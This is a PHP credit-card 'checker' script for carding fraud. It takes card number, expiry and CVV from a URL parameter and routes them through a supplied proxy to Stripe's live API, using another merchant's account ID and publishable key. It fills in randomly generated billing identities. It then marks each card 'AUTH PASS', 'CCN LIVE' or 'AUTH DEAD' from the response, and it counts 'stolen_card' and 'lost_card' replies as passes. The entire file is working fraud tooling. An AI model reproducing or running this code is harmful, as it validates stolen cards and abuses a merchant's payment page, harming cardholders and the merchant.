<?php
///////////by Rafael P //////
//////@hiddencontent | telegram
/////api Stripe 2req ///
////auth live////
    error_reporting(0);
    
 	    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
}
$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
	
	$lista = "$cc|$mes|$ano|$cvv";
	
    }


	function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
	}
	
	
$bin = substr($cc, 0, 6);
$bin = getBin($bin);	
	function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt');
}
/*
$crawleraproxy = 'proxy.crawlera.com:8010';
$proxyauth = 'fb04ba68d60945b793bac549f7ae41e9:';
*/
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";}

////////////////////////////===[For Authorizing Cards]
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json',
'authority: api.stripe.com',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: es-ES,es;q=0.9',
'Content-Type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'User-Agent: '
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][postal_code]='.$postcode.'&guid=2d685697-2ef9-4946-ad04-cc18f19914e461dc64&muid=094df602-3a85-447e-8546-64f7f1be7a967861c8&sid=e5b109e4-4cc5-4459-9285-e32da44a3a5ca27678&_stripe_account=acct_1E3FqyLdZ1bMwK2Y&key=pk_live_mFWXi4jlklSnN4KtDtlLURRK&payment_user_agent=stripe.js%2F686a7039b%3B+stripe-js-v3%2F686a7039b%3B+checkout');

$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"')));
$token3 = trim(strip_tags(getStr($result1,'"client_ip": "','"')));
$token2 = trim(strip_tags(getStr($result1,'"cvc_check": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/ppage_1IS8pYLdZ1bMwK2YuNcr7NMl/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'method: POST',
'path: /v1/payment_pages/ppage_1IS8pYLdZ1bMwK2YuNcr7NMl/confirm',
'scheme: https',
'accept-encoding: gzip, deflate, br',
'accept-language: es-ES,es;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$token.'&expected_amount=3900&_stripe_account=acct_1E3FqyLdZ1bMwK2Y&key=pk_live_mFWXi4jlklSnN4KtDtlLURRK');



$result = curl_exec($ch);
////////////////////////////===[Repuestas]
//////by Rafael P 
//////@hiddencontent | telegram

echo " <font size=3 color='green'><font class='badge badge-secondary'>CHKCVV</font>";

if(strpos($result, '"cvc_check": "pass"')){  
 echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }
   elseif(strpos($result, "Thank You For Donation.")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }
  
  elseif(strpos($result, "Thank You.")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }
  elseif(strpos($result, '"status": "succeeded"')) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }
 elseif(strpos($result, 'Your card zip code is incorrect.')) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }  
  elseif(strpos($result, "incorrect_zip")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }   
  elseif(strpos($result, "Success")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }   
  elseif(strpos($result, "succeeded.")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }  
  elseif(strpos($result, "type one-time")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }  
  elseif(strpos($result, "Your card has insufficient funds.")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }
  elseif(strpos($result, "lost_card")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  } 
  elseif(strpos($result, "stolen_card")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  } 
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo " <font size=3 color='green'><font class='badge badge-light'>CCN LIVE</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  } 
  elseif(strpos($result, "incorrect_cvc")) {
  echo " <font size=3 color='green'><font class='badge badge-light'>CCN LIVE</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }  
  elseif(strpos($result, "pickup_card")) {
  echo " <font size=3 color='green'><font class='badge badge-success'>AUTH PASS</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='green'> $bin </font><br>";  
  }   
  elseif(strpos($result, "Your card has expired.")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "expired_card.")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "Your card number is incorrect.")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "incorrect_number")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "do_not_honor")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "generic_decline")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "Your card was declined.")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, '"cvc_check": "fail"')) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "parameter_invalid_empty")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "lock_timeout")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, 'Your card does not support this type of purchase.')) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "transaction_not_allowed")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "three_d_secure_redirect")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "missing_payment_primaryrmation")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
  elseif(strpos($result, "card_not_supported")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
elseif(strpos($result, 'Your card is not supported.')) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
elseif(strpos($result, "fraudulent")) {
  echo " <font size=3 color='red'><font class='badge badge-warning'>AUTH DEAD</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }
else {
  echo " <font size=3 color='red'><font class='badge badge-warning'>MANTENIMIENTO</i> </font>
  <font size=3 class='badge badge-secondary'>$cc|$mes|$ano|$cvv</font>  
  <font size=2 color='red'> $bin </font><br>";  
  }

curl_close($ch);
///echo $result;
ob_flush();


?>

